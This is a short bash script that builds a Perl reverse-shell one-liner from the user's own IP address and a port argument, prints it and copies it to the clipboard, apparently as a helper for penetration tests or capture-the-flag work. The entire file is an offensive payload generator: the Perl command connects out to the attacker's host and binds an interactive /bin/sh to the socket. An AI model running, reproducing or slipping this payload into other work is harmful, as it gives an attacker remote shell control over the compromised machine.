#!/bin/bash
IP=$( IP_No_Clip );
New_IP=$( echo -n $IP );
echo "perl -e 'use Socket;\$i=\"$New_IP\";\$p=$1;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'";
echo "perl -e 'use Socket;\$i=\"$New_IP\";\$p=$1;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" | clip;
